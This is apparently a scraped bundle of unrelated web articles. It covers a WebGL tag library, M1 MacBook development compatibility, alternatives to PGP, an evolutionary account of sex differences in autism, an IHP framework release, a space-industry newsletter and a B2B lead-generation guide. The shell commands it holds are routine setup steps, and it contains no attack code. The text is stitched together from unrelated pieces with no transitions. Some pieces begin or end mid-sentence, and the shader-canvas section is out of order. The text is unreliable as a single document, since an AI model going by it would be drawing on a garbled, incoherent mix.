<p><img src="https://hugodaniel.com/images/rainbowcube.png" alt="A cube defined by its edges, each edge is a rainbow"></p>
<p>The idea is simple and two-fold:</p>
<ol>
<li>Create an HTML tag for each WebGL function.</li>
<li>Have HTML tags to contain the instances of WebGL primitives.</li>
</ol>
<p>After experimenting for a while with Web Components, I have come up with the
library's initial version.</p>
<p><a href="https://hugodaniel.com/projects/shader-canvas">The shader-canvas project site.</a></p>
<p>It purposely has no graphics or fluffy examples to watch at this stage. It is
a proof-of-concept and the base of my future work.</p>
<h2 id="closing-thoughts">Closing thoughts</h2>
<p>Before I started doing <a href="https://hugodaniel.com/projects/shader-canvas">shader-canvas</a>, I repeatedly wrote the same WebGL code
with small nuances. I looked for inspiration in other libraries in how to
decompose graphical problems. The part that intrigued me most was the balance
between the WebGL API's low-level aspects and its high-level compositions. It
should be possible to target a lower-mid-level of abstraction.</p>
<p>Today is the 10th anniversary of WebGL. It felt appropriate to write about it
and introduce <a href="https://hugodaniel.com/projects/shader-canvas">shader-canvas</a> together with some of
the motivation behind it.</p>
<p><a href="https://hugodaniel.com/projects/shader-canvas">Shader-canvas</a> is a graphics framework that uses HTML
tags to perform the WebGL
API calls and manage its primitives. It does not have a camera or a scene.
Instead, there is a set of tags to declare most of the recurrent WebGL code
that I found myself writing over and over.</p>

            <section>
                <div>
                    <!--kg-card-begin: markdown--><p>So I've been using my new M1-based MacBook Pro for a couple of months for a mix of development, email, and other things an <a href="https://github.com/earthly/earthly">open-source maintainer</a> does day-to-day.</p>
<p>The typical first reaction that you get when using this is "it runs my Docker stack without sounding like a plane taking off??".</p>
<p>It's a pretty amazing piece of engineering, and in many ways, I think that the ARM architecture is the future. A number of fast-growing tech giants (besides Apple) are pouring a ton of money into making ARM work for a ton of use-cases: Nvidia (trying to <a href="https://www.cnbc.com/2020/09/14/nvidia-to-buy-arm-holdings-from-softbank-for-40-billion.html">buy ARM Holdings from SoftBank</a>) and Amazon (deep investment in the new <a href="https://aws.amazon.com/ec2/graviton/">Graviton processors</a>) are the two that primarily come to mind.</p>
<p>As you might know, in processors low energy consumption (and low heat dissipation) often equates to the ability to scale processing efficiently for large workloads. It also means longer battery cycles for non-cloud use-cases (less waste, more bang for the buck). This is why I think ARM is the future, even if it might take a decade for the mainstream cloud to migrate over.</p>
<p>My Xeon Linux-based workstation suddenly feels old.</p>
<h2 id="compatibility">Compatibility</h2>
<p>All the software I need to use "just works". I found that if an ARM-native version is not available for an application, the emulated one works just fine and there's no performance drawback that I can notice. To emulate an application, you just need to install Rosetta 2. The OS will automatically detect that Rosetta is needed and prompt you to install it. However, you can also install it manually via</p>
<pre><code>/usr/sbin/softwareupdate --install-rosetta
</code></pre>
<p>The tools you use for development are likely still catching up to this architectural change, and will be for some time. We engineers sometimes use very low-level system capabilities. In some cases, I had to install preview editions of software, but everything worked very well for me. Here are some programs that I've tested:</p>
<ul>
<li>✅ Chrome (native)</li>
<li>✅ 1Password (emulated)</li>
<li>✅ Zoom (native)</li>
<li>✅ Backblaze (emulated)</li>
<li>✅ Signal (emulated)</li>
<li>✅ Spotify (emulated)</li>
<li>✅ VS Code. The amd64 version works perfectly well, however, the terminal will be an amd64 process, which may cause some programs to also run as amd64. The arm64 native version is available on the <a href="https://code.visualstudio.com/insiders/">VS Code Insiders</a> and works really well.</li>
<li>✅ Docker. M1 native version is a must. Emulation doesn't have virtualization features, which the Docker app requires. You can download the <a href="https://docs.docker.com/docker-for-mac/apple-m1/">Docker App for M1</a>, which is in preview. As mentioned on the documentation page, there are some limitations currently related to HTTP proxy, VPN clients, and performance, but the Docker team is making progress fast. (A month or two ago Kubernetes wasn't working, but now it is!).</li>
<li>✅ Brew (native, encountered some issues with git, but was able to fix them)</li>
<li>✅ iTerm 2 (native)</li>
<li>✅ OBS (emulated)</li>
<li>✅ Earthly (<code>v0.5.1+</code> now supports M1 natively - just <code>brew install earthly</code>)</li>
</ul>
<p>I should also mention that during the first few weeks I had some issues with audio skips when using Bluetooth, but an OS update fixed it (just like <a href="https://www.imore.com/fix-way-m1-mac-bluetooth-problems">Apple promissed</a>).</p>
<p>I also use a ✅ YubiKey 5C Nano and a bunch of random peripherals like a ✅ USB microphone and a ✅ dock plugged into Ethernet.</p>
<p>Languages and frameworks I've tested - most of them in Docker containers:</p>
<ul>
<li>✅ Go. <a href="https://golang.org/doc/go1.16#darwin">1.16 RC adds support for building darwin/arm64 binaries</a>. I built binaries in Docker and ran them natively. Works great.</li>
<li>🟡 Java and Scala. I had issues with the JVM, experiencing random process hangs. It seems that there are no official OpenJDK builds for aarch64, however there are some community options. See more info below.</li>
<li>✅ C++ works fine on native architecture in Docker. Minimal testing though.</li>
<li>🔴 .Net didn't work for me natively nor emulated. I did not investigate why though.</li>
<li>✅ Elixir works fine on native architecture in Docker. Minimal testing though.</li>
<li>✅ gRPC works fine on native architecture in Docker. Minimal testing though.</li>
<li>✅ JavaScript / Node works fine on native architecture in Docker. Minimal testing though.</li>
<li>✅ Python works fine on native architecture in Docker. Minimal testing though.</li>
<li>✅ Ruby and Ruby on Rails works fine on native architecture in Docker. Minimal testing though.</li>
<li>✅ Cobol (yes, really) works fine on native architecture in Docker. Minimal testing though.</li>
<li>✅ Rust works fine on native architecture in Docker. Minimal testing though.</li>
</ul>
<h2 id="howtotellwhatarchitectureaprogramisrunningas">How to tell what architecture a program is running as</h2>
<p>It's extremely easy to mistake the kind of architecture you run as. Rosetta 2 is that good.</p>
<p>The easiest way to tell the difference is by opening Activity Monitor and looking at the Architecture column: if it says <code>Apple</code>, it's ARM. If it says <code>Intel</code>, it's X86_64. Here's how I can tell that Zoom is an ARM process, while Spotify is an X86_64 process.</p>
<p><img src="https://blog.earthly.dev/content/images/2021/02/img1.png" alt="Activity Monitor showing Zoom as an Apple process">
<img src="https://blog.earthly.dev/content/images/2021/02/img2.png" alt="Activity Monitor showing Spotify as an Intel process"></p><p>If you're not sure about the terminal you're using, you can type <code>uname -m</code>. It'll say either <code>X86_64</code>, <code>arm64</code> (mac) or <code>aarch64</code> (linux). <code>arm64</code> and <code>aarch64</code> are both ARM - <code>uname</code> on Mac just reports it differently compared to Linux.</p>
<p><img src="https://blog.earthly.dev/content/images/2021/02/img3.png" alt="Terminal showing the output of 'uname -m' as 'arm64'"></p><h2 id="brewissues">Brew issues</h2>
<p>One issue I encountered on both my M1 laptop and also a <a href="https://www.macstadium.com/m1-mini">MacStadium MacMini</a> instance that we use for Mac testing is that Brew randomly started to complain about git missing. Not sure what the cause of this is, but it could be the fact that brew has been adding native arm support for many packages in the last few months and it's possible that this migration resulted in some inconsistencies. This is pure speculation, however, I've not researched this.</p>
<p>(In any case, a very impressive effort to switch architecture so quickly for a project that hosts so many packages!)</p>
<p>Back to fixing the issue now. Using <code>brew doctor</code> I was able to find out that Xcode needed a (re)install. Easy: <code>xcode-select --install</code>. However, the issue was still there. On the MacStadium instance, I was able to just uninstall brew and reinstall it and everything was fine. I was not as comfortable doing that on my laptop after having installed so much via casks. Instead, I was able to just remove the brew <code>git</code> via <code>brew uninstall git</code> and simply rely on <code>git</code> from Xcode, which seems to work just fine. (If anyone reading this knows what's up with my brew's git and can tell me how to fix it, ping me on Twitter: <a href="https://twitter.com/VladAIonescu">@vladaionescu</a>)</p>
<h2 id="usingdocker">Using Docker</h2>
<p>The Docker preview worked almost flawlessly for me from day 1. Making use of multi-platform images seems daunting at first, but really it's actually pretty simple.</p>
<p>The Docker for Mac app comes packed with <a href="https://www.qemu.org/">QEMU</a> out of the box - so Docker is able to run either arm64 and amd64 images. Most official images are now supported on arm64 too. If you're building an image, by default it'll use your native architecture to execute the build (arm64) and most things will usually just work. Your mileage may vary, however, if you are <code>curl</code>ing some binary that may need to switch from <code>X86_64</code> to <code>aarch64</code> in its URL, or if you're doing lower-level stuff. I also noticed that some alpine packages are also not available for ARM (eg <code>shellcheck</code>).</p>
<p>The Docker team advise that QEMU is a best-effort approach and that it is best to run images natively as much as possible. I have encountered myself issues with some binaries when I tried to emulate them via QEMU. Here's a quote from <a href="https://twitter.com/thajeztah">Sebastiaan van Stijn</a>, member of the Moby Technical Steering Comitee (TSC).</p>
<p><a href="https://github.com/docker/roadmap/issues/142#issuecomment-785013499"><img src="https://blog.earthly.dev/content/images/2021/03/Screen-Shot-2021-03-01-at-10.58.33-AM.png" alt="We will continue looking to improve the emulation, and are also in talk with 🍏, but it will remain a &quot;best effort&quot;, and mostly to help the transition to ARM becoming more mainstream (both on hosting platforms, and in images). Because of the above, the recommendation is to run images that match the architecture."></a></p>
<p>Almost all of the official images are available for either platform. Third party ones are a mixed bag, with most of the community only offering amd64 versions. As a sample, the <a href="https://hub.docker.com/r/wurstmeister/kafka">Kafka community image</a> is amd64 only. The <a href="https://hub.docker.com/_/redis">Redis image</a> is multi-platform. How can you tell? Go to the <a href="https://hub.docker.com/layers/redis/library/redis/latest/images/sha256-bca6e887ba6b58ed572cfecd7043eae16213fd537aa4a65facb9e70eed9c4964?context=explore">Docker Hub page for a tag (eg <code>latest</code>)</a> and look for this dropdown. If the dropdown exists, it means that it's a multi-platform image.</p>
<p><img src="https://blog.earthly.dev/content/images/2021/03/Screen-Shot-2021-03-02-at-1.15.36-PM.png" alt="Screenshot of Docker Hub tag page with multi-platform dropdown"></p><p>To build an image for a different architecture, you can use <code>docker buildx build --platform=linux/amd64 .</code> instead of the usual <code>docker build .</code>. For more details on building multi-platform images see <a href="https://medium.com/nttlabs/buildx-multiarch-2c6c2df00ca2">Akihiro Suda's blog</a>.</p>
<p>If you <code>docker pull</code> an image from the registry, it will again default to your native architecture (if available), unless you specify <code>--platform=linux/amd64</code>.</p>
<p>If you <code>docker run</code> an image, it will default to whatever version of the image you have available locally or it will attempt to pull the arm64 version from the registry. You can also override the platform via <code>--platform=linux/amd64</code> if you'd like to run the amd64 version specifically.</p>
<p><img src="https://blog.earthly.dev/content/images/2021/02/img4.png" alt="Terminal showing the output of 'uname -m' for different platforms"></p><p>Docker Compose will happily run a mixture of various architectures. The same rules apply with regards to pulling and running. You can also specify <code>platform: linux/amd64</code> for the service definition in <code>docker-compose.yml</code> if you'd like to be specific.</p>
<p>One thing to note is that Docker-in-Docker is not supported by QEMU (<a href="https://github.com/moby/qemu/pull/7">abandoned PR here</a>). So you cannot run an arm64 Docker in an amd64 Docker or vice-versa. <strong>However</strong>, if you run your natively-supported Docker-in-Docker, the inner Docker can still run multi-platform images fine.</p>
<p>Another issue that I noticed with the Docker preview on the M1 is that there are currently performance issues with multi-processor use - so much so that performance using a single core is sometimes slightly better than the performance of using 8 cores. Or at least that's what <a href="https://github.com/docker/roadmap/issues/142#issuecomment-772732443">@jasmas claims</a>. I've also seen some <a href="https://github.com/docker/for-mac/issues/5389#issuecomment-785857638">benchmarks testing the import of a database like MySQL</a>, and it seems that there are some clear performance issues (~25X) with the Apple virtualization API. I've not seen such a drastic difference in common use, but hopefully these are addressed soon.</p>
<h2 id="usingvscode">Using VS Code</h2>
<p>Native support for Apple Silicon is not yet available in the generally available VS Code version, but running the amd64 emulated version works pretty well. You can also use the native version via a VS Code Universal build (contains both architectures in a single package) available via <a href="https://code.visualstudio.com/insiders/#osx">VS Code Insiders</a>.</p>
<p>Edit: The <a href="https://code.visualstudio.com/">latest stable version of VS Code</a> now includes the Mac Universal variant.</p>
<p>An issue I ran into with the amd64 version was that I did not realize that the terminal was also an amd64 process (Again, Rosetta 2 is just …</p></div></section></article></div></div></div>

Maybe you're just tired of <a href="https://gist.github.com/grugq/03167bed45e774551155">living like a spy</a> and never using smartphones. Whatever it is, you're here, and you're finally ready to <a href="https://blog.filippo.io/giving-up-on-long-term-pgp">give up on PGP</a>. That's great!</p><figure><img src="https://blog.gtank.cc/content/images/2019/02/225357.jpg"><figcaption>We're here to help!</figcaption></figure><p>No one was sending you encrypted emails anyway, so that's easy enough. But the most widespread uses of PGP are machine-oriented, for needs like package signing and local file encryption. I recently got into this again on a thread that mentioned <a href="https://github.com/golang/go/issues/30141">deprecating Go's OpenPGP package</a> and people always ask the same question: if not PGP, then what?</p><p>The thing is, there can't be a direct modern alternative to PGP. It's a do-everything design that predates modern cryptographic engineering and hasn't worked out well. The "modern alternative" is to use a much more specific and much less configurable solution to your problem.</p><p>Here are the most common uses of PGP and their modern, focused alternatives.</p><h2 id="signatures-for-os-or-package-updates">Signatures for OS or package updates</h2><p><strong>Original need:</strong> <a href="https://tutorials.ubuntu.com/tutorial/tutorial-how-to-verify-ubuntu#0">Linux distributions</a> and many other software update mechanisms use PGP signatures to prevent malicious mirrors or network attackers from altering the contents of their packages.</p><p><strong>Modern alternative:</strong> a lightweight signing tool like OpenBSD's <a href="https://https.www.google.com.tedunangst.com/flak/post/signify">signify</a> or <a href="https://jedisct1.github.io/minisign/">minisign</a>, either of which you could quickly build in Go using <a href="https://godoc.org/golang.org/x/crypto/ed25519">x/crypto/ed25519</a>. I wrote one as a <a href="https://github.com/gtank/sshsign">party trick</a> last month – it's less than 200 lines of code and that includes some silly key parsing tricks.</p><p>These tools are extremely simple and robust because they only support one algorithm, lack state or any notion of a keyring, and are usually decoupled from complex messaging formats (which should be a separate concern from your signature cryptography). As a bonus they're mostly compatible with each other because the keys are all <a href="https://tools.ietf.org/html/rfc8032">EdDSA</a> keys. Need I even mention that EdDSA is much, much faster than RSA?</p><p>If you're a maintainer of self-serve packaging infrastructure or otherwise have more complex needs, you should take a look at <a href="https://theupdateframework.github.io/">TUF</a>. It's a modern toolkit meant to resist all kinds of update-related attacks that PGP signatures simply don't address. For an idea of how it works in practice, check out the designs for Python's package infrastructure (<a href="https://www.python.org/dev/peps/pep-0458/">PEP 458</a>, <a href="https://www.python.org/dev/peps/pep-0480/">PEP 480</a>). The <a href="https://github.com/theupdateframework/notary">Notary project</a> is a productionized and audited implementation.</p><h2 id="encrypting-data-blobs">Encrypting data blobs</h2><p><strong>Original need: </strong>You want to store individual pieces of data without making their contents accessible to anyone else on your system. For some reason this isn't built into operating systems yet, so programs like <a href="https://www.passwordstore.org/">pass</a> use PGP.</p><p><strong>Modern alternative: </strong><a href="https://godoc.org/golang.org/x/crypto/nacl/box">nacl/box</a> and <a href="https://godoc.org/golang.org/x/crypto/nacl/secretbox">nacl/secretbox</a>. These are general-purpose replacements for encrypting any kind of data. They support public-key and secret-key encryption, respectively, and both use secure modern modes and ciphers.</p><p><a href="https://keybase.io/">Keybase</a> made a very solid attempt to specify nacl in a storable message format with <a href="https://saltpack.org/">saltpack</a>, which has a good Go implementation using the above x/crypto package. It works as a nearly drop-in replacement anywhere you were using ASCII-armored PGP data.</p><h2 id="sending-files-securely">Sending files securely</h2><p><strong>Original need: </strong>You have files that you want to send to another person, but you don't want the data to be visible in transit or stored in the cloud. For this, folks often attach an encrypted ZIP file to an email.</p><p><strong>Modern alternative: </strong><a href="https://magic-wormhole.readthedocs.io/en/latest/welcome.html">magic-wormhole</a>. If you need to send files to another person securely, use this. It's based on a modern cryptographic technique called <a href="https://blog.cryptographyengineering.com/2018/10/19/lets-talk-about-pake/">PAKE</a>, which basically means it keeps your data safe in transit while giving an attacker no chance to crack the password. It generates those passwords for you, and they're short, one-time-use combinations of three English words – all your recipient needs to do is enter the words. There's nothing to remember long-term and no account information to lose in a data breach. Wormhole also works through firewalls and optionally supports Tor.</p><p>We live in the future. There are better options than emailing encrypted files around.</p><h2 id="something-else">Something else?</h2><p>What's your lingering use case for PGP? Hit me up <a href="https://twitter.com/gtank__">on Twitter</a> or send me <a href="mailto:blog@gtank.cc?subject=I'm%20still%20using%20PGP">an email</a> and let's talk about getting you off PGP for good.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>Evolutionary forces drive a glaring gender imbalance in the occurrence of many health conditions, including autism, a team of genetics researchers has concluded.</p>
<p>The human genome has evolved to favour the inheritance of very different characteristics in males and females, which in turn makes men more vulnerable to a host of physical and mental health conditions, say the researchers responsible for a&nbsp;<a href="https://link.springer.com/article/10.1007%2Fs00239-021-09999-9" target="_blank" rel="noopener noreferrer">new paper</a>&nbsp;published in the&nbsp;<i>Journal of Molecular Evolution</i>.</p>
<p>Their analysis shows that while there are certain conditions that occur only in women (cervical cancer and ovarian cancer, for example), or much more frequently in women (such as multiple sclerosis), men are more prone to medical conditions overall and, as a result, on average die sooner than women.</p>
<p>“Our cells have memories and they carry the accumulation of all the changes our ancestors have experienced over millions of years,” says Rama Singh, a McMaster biology professor who wrote the paper with his son, Karun Singh, an associate professor of neuropathology at the University of Toronto,&nbsp;and Shiva Singh (no relation), a biology professor at Western University.</p>
<p>The researchers looked at autism as an illustration of the general tendency for men to develop medical conditions more often than women. Though women and men inherit the same genetic blueprints from their parents, the way those blueprints are expressed is very different, depending on sex.</p>
<p>“If women and men were any more different, they would be different species,” jokes Rama Singh, the paper’s corresponding author.</p>
<p>The researchers’ work is part of a growing movement toward exploring genomic influences on health, using hereditary patterns to understand and project health impacts on individuals and populations.</p>
<p>“One of the reasons I think this is interesting is that it offers a perspective that is not well represented in the medical literature,” says Karun Singh. “This is a really good example of the perspective that geneticists and evolutionary biologists can add to health research.”</p>
<p>The paper explores hereditary forces that have evolved over millions of years, favoring mate selection and reproduction in the early years of male sexual maturity at the expense of longer-term well-being.</p>
<p>Though human behaviour regarding mate selection has changed, those genetic characteristics remain and continue to be expressed in the health and development of modern men.</p>
<p>Women, the researchers say, typically live longer and are less vulnerable to most health conditions because their genetic makeup has evolved in reaction to the unhealthy characteristics of the male genome, creating better immunity and greater longevity.</p>
<p>Understanding human health through the lens of genomics can and should guide the search for treatments and preventions, the researchers say.</p>
<p>Though the origins of mental health conditions are more complex, they are influenced by the same evolutionary factors, the authors say. Women are more prone to depression and anxiety, for example, while men are more likely to develop anti-social disorders.</p>
<p>In autism, male-female imbalance is especially pronounced.&nbsp;Boys are as much as four times more likely to have some form of autism and are also more likely to have severe symptoms.</p>
<p>Evolution appears to have created a higher threshold that protects more women from developing the condition, the authors say.</p>
<p>While autism is not solely attributable to inherited characteristics, it appears that boys are more likely to inherit characteristics that render them more vulnerable to environmental, developmental and other factors, creating more pathways that can lead to autism.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Better performance, new plugins, logging, websockets, more query builder functions and more!</strong></p>

<p>On friday we released a new version of IHP - the productivity-focused, magical-feeling-inducing haskell web framework for 
the future!</p>

<p>To celebrate, here's the some of the awesomeness you can try out right now, after following the <a href="https://ihp.digitallyinduced.com/Guide/index.html">Getting Started Guide</a>:</p>

<h2>New plugins</h2>
<p>While we're still developing the plugin API, we're already building some for you to use! This way we can make sure that the API makes sense and supports all use-cases. Now, with the new release, you can use these two new plugins with your IHP Apps:</p>

<h3>ihp-sentry</h3>
<p>Error reporting is vital to web app development, and sentry is a popular solution for this. As such, it's now easier than ever to integrate it into your IHP app. Check out the plugin's readme for details on how to get it running inside your IHP app: <a href="https://github.com/digitallyinduced/ihp-sentry">https://github.com/digitallyinduced/ihp-sentry</a>.</p>

<h3>ihp-zip</h3>
<p>Sometimes your users want to download a lot of files at once. Especially with the DSGVO, users could always request all their data from your website. What better way to handle this than implementing a simple zip-download containing everything they ask for? Previously this might've been a hassle, but now with the new ihp-zip plugin, it's a breeze. Just like before, check out the plugin's readme for installation and usage instructions: <a href="https://github.com/digitallyinduced/ihp-zip">https://github.com/digitallyinduced/ihp-zip</a>.</p>

<h2>WebSockets</h2>
<p>IHP has always used websockets to update the frontend, and now you can easily use a custom websocket connection too! Just think of the possibilities: chat applications, real-time updates, games...</p>

<p>Of course, to get started you'll have to learn how to tap into this newfound power. Don't worry, we've got you covered: <a href="https://ihp.digitallyinduced.com/Guide/websockets.html">https://ihp.digitallyinduced.com/Guide/websockets.html</a>.</p>

<h2>Better Performance</h2>
<p>Everyone loves themselves a faster server. It's best when you don't even have to do anything to get the benefits. So, IHP v0.9 uses GHC's new non-moving memory, which should improve performance of all those awesome IHP apps out there! (Not that there was a performance issue before... But faster is always better, isn't it?)</p>

<h2>Logging</h2>
<p>We've already talked about error reporting. However, logging is just as important. And IHP now has its own Logging module ready for you to use! Say goodbye to <code>putStrLn</code>, and say welcome our new overlords <code>Log.debug</code>, <code>Log.info</code>, <code>Log.error</code>, <code>Log.warn</code>, <code>Log.fatal</code> and <code>Log.unknown</code>! You can even customize what a single line of logging looks like. Check out the detailed documentation: <a href="https://ihp.digitallyinduced.com/Guide/logging.html">https://ihp.digitallyinduced.com/Guide/logging.html</a>.</p>

<h2>Query Builder Functions</h2>
<p>There's a whole bunch of these:</p>

<h3><code>withTransaction</code></h3>
<p>...allows you to run multiple queries in a single database transaction.</p>

<h3><code>setJust</code></h3>
<p>...so you can simply do <code>project |&gt; setJust #userId (get #id user)</code> instead of <code>project |&gt; set #userId (Just (get #id user))</code>.</p>

<h3><code>distinct</code></h3>
<p>To remove duplicate rows from your query results.</p>

<p>...and more!</p>

<h2>Increased Magic</h2>
<p>Yepp, you heard that right. Actually this is related to AutoRoute. You can finally use more than just UUIDs and Id Project-like arguments for your controllers, without having to manually configure parseArgument. This simply means: less boilerplate, more magic, more productivity! We wrote it, so you don't have to.</p>

<h2>Conclusion</h2>
<p>This release held a bunch of awesome things, and we're happy that it's finally out there. If you want to read up on all the other awesome things that changed, here's the link to the changelog on Github: <a href="https://github.com/digitallyinduced/ihp/releases/tag/v0.9.0">https://github.com/digitallyinduced/ihp/releases/tag/v0.9.0</a>.</p>

<p>If you still haven't checked out IHP, now's as good a time as any. Also, join us in our community Slack: <a href="https://ihp.digitallyinduced.com/Slack">https://ihp.digitallyinduced.com/Slack</a>.</p>

<p>That's it! Tell us what your favorite feature of this release is, and till next time!</p></div></div>]]>

Scientists will be <a href="https://iawn.net/obscamp/Apophis/" target="_blank">watching</a> the 370 meter-wide asteroid <a href="https://en.wikipedia.org/wiki/99942_Apophis" target="_blank">99942 Apophis</a> fly by the Earth this Friday, albeit from a safe 0.11 AU away. On Friday the 13th, April 2029, however, Apophis will pass within 31,000 km of the Earth’s surface, inside the orbit of geostationary satellites. Fortunately, while originally estimated at a 1-in-37 chance of a collision in 2029, that possibility has since been ruled out. At the recent “<a href="https://www.hou.usra.edu/meetings/apophis2020/program/" target="_blank">Apophis T-9 Years</a>” workshop there were proposals for CubeSats, small landers, and larger SLS-launched sample return missions targeting the 2029 flyby. It’s also possible that OSIRIS-REx, after dropping samples off at Earth, could head to Apophis as a mission extension with multiple flybys and finally a rendezvous. On average, an asteroid of Apophis’s size impacts the Earth every 80,000 years, and while Apophis won’t impact the Earth in 2029 or 2036, there is still a <a href="https://cneos.jpl.nasa.gov/sentry/details.html#?des=99942" target="_blank">small possibility of an impact in 2068</a> (but this too will likely be ruled out by <a href="https://echo.jpl.nasa.gov/asteroids/Apophis/apophis.2021.goldstone.planning.html" target="_blank">upcoming planetary radar measurements</a>). Until we are confident of a miss, however, we should be very careful because even “<a href="https://www.thespacereview.com/article/4080/1" target="_blank"><em>[a] tiny change in Apophis’ velocity before the April 2029 flyby, caused by the collision of a small satellite with the asteroid, could shift the asteroid’s trajectory by several Earth radii in 2068</em></a>.” Jeff Foust has a <a href="https://www.thespacereview.com/article/4080/1" target="_blank">good discussion</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#heavy-delays">¶</a><strong id="heavy-delays">Heavy Delays.</strong> This past week we learned of schedule changes for three in-development heavy lift rockets with very different development histories. NASA, after SLS failed its full-duration hot fire test in January, has now <a href="https://www.nasaspaceflight.com/2021/02/prevalve-issue-delays-sls-green-run/" target="_blank">postponed the re-test for at least three more weeks</a> due to <a href="https://blogs.nasa.gov/artemis/2021/02/26/green-run-update-nasa-inspecting-valve-continuing-hot-fire-preparations/" target="_blank">LOX pre-valves on the Core Stage</a> that won’t open fully (the LH<sub>2</sub> pre-valves were repaired in the fall). Platforms have to be installed so that technicians can use specially-fabricated tools to access and repair the valves. This continues the litany of delays, overruns, and failures for the incredibly expensive and under-powered giant. In a recent scathing critique, <a href="https://caseyhandmer.wordpress.com/2021/02/24/sls-is-cancellation-too-good/" target="_blank">Casey Handmer calls for SLS’ outright cancellation</a>, claiming that its Shuttle heritage has hurt its safety, development speed, and ultimate usefulness, and that it is only propped up by lobbying, political maneuvering, and NASA’s unwillingness to acknowledge a failure. He quips, <em>“even if SLS wasn’t architecturally unsafe, poorly managed, incredibly expensive, a technological dead end, obsolete, and cursed by a low production rate, it would still have nowhere to go.”</em> SLS’s Block 1 design doesn’t have the power to send humans to the lunar surface (thus the need for the separately-launched <a href="https://www.nasa.gov/content/more-about-the-human-landing-system-program" target="_blank">Human Landing System</a>) or Mars, or to send large spacecraft to deep space exploration targets. While the allure of returning to the Moon permanently is strong, SLS feels more and more like an unrealistic way to accomplish that goal. Meanwhile, Blue Origin updated New Glenn’s first launch date to NET 2022Q4, <a href="https://arstechnica.com/science/2021/03/so-what-really-happened-with-blue-origins-new-glenn-rocket/" target="_blank">roughly what CEO Bob Smith suggested it should be upon taking the helm in 2017</a>. New Glenn has struggled through development, in part due to its massive scale up from New Shepard—building a heavy lift rocket before ever reaching orbit is a monumental undertaking. Blue Origin <a href="https://www.blueorigin.com/news/new-glenns-progress-towards-maiden-flight" target="_blank">cast shade toward Space Force</a> for not selecting them in their recent contracting process—but blaming them can yield nothing positive for the company. It’s also probably not the real cause of the delay, with the company’s priorities being focused on leading the <a href="https://www.blueorigin.com/blue-moon/national-team" target="_blank">National Team’s bid to build the HLS</a> and delivering flight-qualified <a href="https://en.wikipedia.org/wiki/BE-4" target="_blank">BE-4 engines</a> to ULA for this summer’s maiden Vulcan Centaur launch—the staged-combustion methalox engine <a href="https://arstechnica.com/science/2020/10/ula-chief-says-the-be-4-rocket-engines-turbopump-issues-are-resolved/" target="_blank">suffered late-stage development hiccups with its turbo pump</a>. (Blue Origin recently released videos of their Cape Canaveral <a href="https://twitter.com/blueorigin/status/1364968313047162880?s=20" target="_blank">rocket factory</a>, <a href="https://twitter.com/blueorigin/status/1364968720364429317?s=20" target="_blank">tank cleaning and testing facility</a>, and work at <a href="https://twitter.com/blueorigin/status/1364969291746074628?s=20" target="_blank">Launch Complex 36</a>.) In stark comparison, last week Starship SN10 performed a static fire (<a href="https://youtu.be/XE9K3W0ojjk" target="_blank">video</a>), a Raptor engine was swapped out (<a href="https://youtu.be/iuoZjizF_J8?t=127" target="_blank">video</a>), and a second static fire was performed in less than 48 hours (<a href="https://youtu.be/CshqxSkzSYg" target="_blank">video</a>)—the engine was removed <a href="https://twitter.com/elonmusk/status/1364473175279620096?s=21" target="_blank">due to suspect data</a> produced during the initial test. SN10 is now cleared for a flight and triple-engine landing attempt NET today, pushed back from last Friday. While SLS is further along, it’s been under development in some form since the late ‘90s. The difference in development velocity (we’ll call it ∆v) between these three vehicles is striking.

<p>In sales, business-to-business (B2B) lead generation refers to the first step of an outbound sales process. It consists of sourcing contact information about potential new customers.</p>

<p>B2B lead generation is an important step for both sales &amp; marketing teams. However, in this blog post, we will focus more on relevant tactics and strategies for B2B sales teams selling online (i.e. via email, social media, etc).</p>



<p>It’s simple. You don’t want to waste your team’s resources (money and time) selling ice to Eskimos. Even if you’re able to convince a few of them, they will soon realize that your product/service is useless to them.</p>

<p>Having a great lead generation process means getting the right people to use your product/service. This leads to higher conversion rates in your sales &amp; marketing funnels and happier customers to provide good reviews and referrals.</p>



<p>A great B2B lead generation process is able to generate a considerable amount of leads at the top of the funnel. Of course, numbers will differ a lot between companies and industries, but the idea is that you’re able to source enough leads and still make sure you are targeting the niche of customers that truly benefit from your product / service.</p>

<p>Your ultimate goal is to find <strong>the leads</strong> with the most potential to become your next customers, by looking for purchase intent signals online.</p>

<p>How? Let’s get practical with a few examples of B2B lead generation tactics.</p>



<h2 id="1generateleadsfrompeopleinteractingwithlinkedincontent">1. Generate leads from people interacting with LinkedIn content</h2>

<p>Every day, many professionals open their thoughts for discussion on LinkedIn. Every time this happens, lots of interactions are generated. </p>

<p>People that are liking or commenting on those thoughts are publicly showing alignment with a topic that is relevant to them. This opens the possibility to find an entire audience out there that might be ready to start a conversation with you. How amazing is that?</p>

<p>We’ve recently written an article about this lead generation strategy, you can follow the <a href="http://blog.amplemarket.com/generate-leads-linkedin-content/?utm_source=blog_lead_gen&amp;utm_medium=referral&amp;utm_campaign=blog_lead_gen">complete step-by-step guide</a> of this approach or <a href="https://www.youtube.com/watch?v=a4yVFRuycZQ&amp;feature=youtu.be">watch our 15min webinar here</a>.</p>

<p>PS: If you’re already thinking about how you’ll have the time to gather data from all the profiles on these posts, here’s the solution. Extracting leads from LinkedIn content is a seamless experience with Amplemarket’s LinkedIn extension:</p>

<p><img src="https://i.imgur.com/UMIcTfL.jpg" alt="[b2b lead generation]" title=""></p>

<h2 id="2generateleadsfromnewmanagersongrowingteams">2. Generate leads from new managers on growing teams</h2>

<p>Sales Navigator is a powerful tool for lead generation because LinkedIn has access to a lot of data that it’s virtually impossible to replicate. </p>

<p>This tactic uses Sales Navigator to find the decision-makers that:</p>

<ul>
<li>Have available money to spend right now</li>
<li>Want to shake things up with new processes and tools</li>
</ul>

<p>Of course, LinkedIn doesn’t give you the data like this, but there are 2 really good proxies you can use.</p>

<ol>
<li>Filter accounts by headcount growth and department headcount growth</li>
</ol>

<p>On account filters, you should target companies that are growing in general, but also in specific departments relevant to your product. This will signal higher purchase intent because growing teams are certainly looking to adopt new processes and tools to accommodate their tool.</p>

<ol>
<li>Filter leads by decision-makers that changed jobs in the last 90 days</li>
</ol>

